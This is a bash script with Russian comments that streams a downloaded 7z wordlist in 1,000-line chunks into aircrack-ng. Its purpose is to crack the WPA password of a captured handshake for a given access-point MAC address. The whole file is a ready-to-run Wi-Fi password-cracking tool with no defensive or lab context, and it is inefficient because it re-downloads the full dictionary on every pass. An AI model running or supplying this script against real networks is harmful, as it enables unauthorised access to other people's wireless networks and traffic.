#!/bin/bash

# Укажите URL для скачивания словаря
URL="https://example.com/dictionary.7z"

# Укажите путь к pcap файлу и MAC-адрес
PCAP_FILE="capture.pcap"
MAC_ADDR="AA:BB:CC:DD:EE:FF"

# Укажите путь к словарю
DICT_FILE="dictionary.7z"

# Количество строк, которые будем обрабатывать за раз
LINES_PER_PART=1000

# Скачиваем словарь и распаковываем его на лету, передаем в aircrack-ng частями
echo "Начинаем скачивание и перебор словаря..."

# Подсчитаем количество строк в словаре (на лету)
total_lines=$(wget -qO- "$URL" | 7z e -so | wc -l)

# Перебираем словарь частями
for ((i=0; i<$total_lines; i+=$LINES_PER_PART)); do
    echo "Обрабатываем строки с $((i+1)) по $((i+LINES_PER_PART))..."
    
    # Скачиваем словарь, распаковываем и передаем только текущую часть в Aircrack-ng
    wget -O - "$URL" | 7z e -so | head -n $((i + LINES_PER_PART)) | tail -n $LINES_PER_PART | aircrack-ng -w - -b "$MAC_ADDR" "$PCAP_FILE"
    
    # Проверяем, если найден ключ, выходим
    if [ $? -eq 0 ]; then
        echo "Пароль найден!"
        exit 0
    fi
done

echo "Перебор завершён, пароль не найден."
